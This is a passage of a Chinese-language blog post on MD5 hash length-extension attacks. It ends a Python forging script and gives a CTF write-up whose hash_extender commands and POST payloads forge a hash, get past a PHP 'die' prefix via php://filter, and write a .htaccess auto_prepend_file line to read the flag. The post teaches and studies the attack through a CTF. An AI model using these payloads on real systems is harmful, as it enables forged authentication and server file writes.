+</span></span><span class="line"><span class="cl">        <span class="n">aa</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">cc</span><span class="p">,</span> <span class="n">dd</span> <span class="o">=</span> <span class="n">abcd_list</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_1</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_1</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_2</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_2</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_3</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_3</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_4</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_4</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">F</span><span class="p">,</span> <span class="n">order_1</span><span class="p">,</span> <span class="n">shi_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">order_2</span><span class="p">,</span> <span class="n">shi_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">order_3</span><span class="p">,</span> <span class="n">shi_3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">I</span><span class="p">,</span> <span class="n">order_4</span><span class="p">,</span> <span class="n">shi_4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_a</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">aa</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_b</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_c</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_d</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">dd</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">output_a</span><span class="p">,</span> <span class="n">output_b</span><span class="p">,</span> <span class="n">output_c</span><span class="p">,</span> <span class="n">output_d</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Ti_count</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(ascii_list)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">show_result</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">url_append</span><span class="p">(</span><span class="n">hex_bit</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">len_append</span> <span class="o">=</span> <span class="s1">&#39;0x</span><span class="si">{}{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span> <span class="p">(</span><span class="mi">18</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">hex_bit</span><span class="p">))</span><span class="o">*</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="n">hex_bit</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">len_append</span> <span class="o">=</span> <span class="n">reverse_hex</span><span class="p">(</span><span class="n">len_append</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(len_append)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">len_append</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span><span class="mi">0</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">t</span> <span class="o">+=</span> <span class="s1">&#39;%&#39;</span><span class="o">+</span><span class="n">len_append</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">t</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    修改res为已知哈希值
+</span></span></span><span class="line"><span class="cl"><span class="s1">    extend 为拓展值
+</span></span></span><span class="line"><span class="cl"><span class="s1">    自动遍历出1-30长度的payload url编码表达式
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="s1">&#39;1c3de59d2f68788cc792e0eb7d604710&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">extend</span> <span class="o">=</span> <span class="s1">&#39;}&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(reverse_hex(&#39;0x&#39; + res))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">45</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_bit</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">url_append</span><span class="p">(</span><span class="n">hex_bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[</span><span class="si">%d</span><span class="s1">]&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">,</span><span class="n">md5_lea</span><span class="p">(</span><span class="n">extend</span><span class="p">,</span><span class="n">res</span><span class="p">,</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(&#39;{}%80{}{}{}&#39;.format(&#39;X&#39;*i, (55-i)*&#39;%00&#39;,t, extend) )</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;%80</span><span class="si">{}{}{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="mi">55</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="s1">&#39;%00&#39;</span><span class="p">,</span><span class="n">t</span><span class="p">,</span> <span class="n">extend</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># print(&#39;{}{}&#39;.format( hex(i), (18-len(hex(i)))*&#39;0&#39;) )</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># from urllib.parse import unquote</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(md5_lea(&#39;kingkk&#39;,&#39;571580b26c65f306376d4f64e53cb5c7&#39;,10))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="demo2" class="headerLink">
+    <a href="#demo2" class="header-mark"></a>DEMO2</h2><p>这个是kengwang师傅出的一道题目</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;secret.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$userhash</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$secret</span> <span class="o">.</span> <span class="nv">$input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;37870febc8d470109a867802b8031454&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;No no, Don&#39;t change the secret.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Secret&#39;s length is &#34;</span> <span class="o">.</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;    &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Is that enough? Let&#39;s see...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$userhash</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nv">$hash</span> <span class="o">===</span> <span class="nv">$userhash</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Congratulations! I will write your input into file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;[[&#34;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// take it easy, i will change the return for you   
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$filename</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$secret</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Think Extensively.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里同样也给出了加密前的secret的md5值，我们这里就当做data也就是demo1的yusa是空值即可。
+当然因为这里加入了死亡杂糅的内容所以这里我放出wp，其实总的来说还是上面分析的方法。</p>
+<p>我们可以使用 <code>hash_extender</code> 这个工具来进行哈希长度扩展攻击, 生成新的密文</p>
+<p>首先考虑将<code>secret</code>写入到一个文件中</p>
+<p>执行:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">hash_extender -s 37870febc8d470109a867802b8031454 -a <span class="s2">&#34;[[a.txt&#34;</span> -f md5 -l <span class="m">13</span> -d <span class="s1">&#39;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Type: md5
+</span></span><span class="line"><span class="cl">Secret length: 13
+</span></span><span class="line"><span class="cl">New signature: 4f150e4b71070951112f56be4044c181
+</span></span><span class="line"><span class="cl">New string: 8000000000000000000000000000000000000000000000000000000000000000000000000000000000000068000000000000005b5b612e747874
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>可能需要用 CyberChef 套 From Hex (Auto) - To Base64</p>
+</blockquote>
+<p>发送:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">dino-ctf.kengwang.com.cn:32857</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hash=4f150e4b71070951112f56be4044c181&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1thLnR4dA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问 <code>a.txt</code></p>
+<p>发现<code>secret</code>是<code>&lt;?php die(); </code>, 接下来是死亡 die 绕过</p>
+<p>这里需要用到伪协议的一些技巧:</p>
+<p>首先利用 <code>string.strip_tags</code> 的过滤器链吞掉之前的死亡 die, 然后再在后面接上你想要写的内容</p>
+<p>这里使用写 <code>.htaccess</code> 的方法来实现rce, 直接加个 <code>auto_prepend_file</code> 即可</p>
+<p>构造出 <code>php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file flag\n#/resource=.htaccess</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hash_extender -s 37870febc8d470109a867802b8031454 -a <span class="s2">&#34;[[php://filter/write=string.strip_tags/?&gt;php_value auto_prepend_file flag\n#/resource=.htaccess&#34;</span> -f md5 -l <span class="m">13</span> -d <span class="s1">&#39;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终 payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:32768</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hash=473640a1e1ec5efa6bdaf4c7c8f04482&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgAAAAAAAAAW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3MvPz5waHBfdmFsdWUgYXV0b19wcmVwZW5kX2ZpbGUgZmxhZ1xuIy9yZXNvdXJjZT0uaHRhY2Nlc3M
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即可写入</p>
+<h1 id="conclusion" class="headerLink">
+    <a href="#conclusion" class="header-mark"></a>Conclusion</h1><p>总的来说，这个攻击方法还是很好玩的，只不过发现市面上很多的文章写的不尽人意，看了一天都可能不明白其中的原理，写的过于抽象所以想着写写。
+只要我们注意到MD5中加密过程中的填充和多轮压缩，并且利用即可，当然也有很多工具可以生成一些playload，这个就不放出来了。
+最后感谢kengwang师傅，x1r0z师傅的指导</p>
+<p>参考文章：
+1、 <a href="https://xz.aliyun.com/t/10602" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/10602</a>
+2、 <a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener noreferrer">https://github.com/iagox86/hash_extender</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-04-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/hash/">Hash</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ld_preload/" class="prev" rel="prev" title="LD_PRELOAD学习"><i class="fas fa-angle-left fa-fw"></i>LD_PRELOAD学习</a>
+            <a href="/posts/%E6%B5%85%E8%B0%88bashfuck/" class="next" rel="next" title="浅谈BashFuck">浅谈BashFuck<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
